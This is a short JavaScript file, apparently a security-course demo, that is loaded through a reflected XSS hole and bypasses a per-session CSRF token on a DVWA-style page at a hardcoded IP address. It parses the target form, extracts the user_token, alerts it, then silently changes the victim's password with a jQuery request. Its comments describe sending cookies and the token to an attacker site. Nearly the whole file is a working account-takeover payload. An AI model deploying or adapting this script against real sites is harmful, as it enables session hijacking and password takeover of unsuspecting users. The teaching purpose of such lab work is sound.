/*
COMS W4995
CSRF high demo for csrf token bypass

This script loads via RXSS vulnerability
*/

function steal_token(url){

    // add jquery for easy form submit
    // jQuery lets us submit form without redirection
    // thus user is unaware of password attack
    var body = document.getElementsByTagName('body')[0];
    body.appendChild(document.createElement('script')).src='https://code.jquery.com/jquery-3.2.1.min.js';

    var xhr = new XMLHttpRequest();
    xhr.responseType = "document"; //parse html
    xhr.open("GET", url);

    xhr.onload = function(event){
        // extract form and use csrf token embedded
        var dom = xhr.responseXML;
        var form = dom.forms[0];

        //get input fields
        inputs = form.getElementsByTagName('input');

        // csrf token is vulnerable because it is generated
        // per session, not per request and the xss helps
        // us bypass csrf irrespective of validity
        var token = null;

        // extract csrf token from form
        for (var i = 0; i < inputs.length; i++) {
            if (inputs[i].getAttribute('name') == 'user_token')
            {
                token = inputs[i].value;
                break;
            }
        }
        alert('CSRF TOKEN STOLEN:' + token);

        //ideally send document.cookie and
        //csrf token in form[3].value to 
        //attacker site, which should exploit these
        //I do not currently have a webserver (github is static)
        //I demonstrate the second part below

        //The attacker constructs a form on their
        //side and sends with stolen cookie and 
        //csrf token

        var password = 'password';
        var data = {
            'password_new': password,
            'password_conf': password,
            'Change': 'Change',
            'user_token': token
        }

        //change passowrd using stolen csrf
        $.ajax({
            url: url,
            type: 'GET',
            data: data,
            success: function(response){
                alert('CSRF bypassed: ' + password);
            }
        });
    };
    xhr.send(null);
}

//csrf token
steal_token('http://35.184.56.63/PA4/vulnerabilities/csrf/');
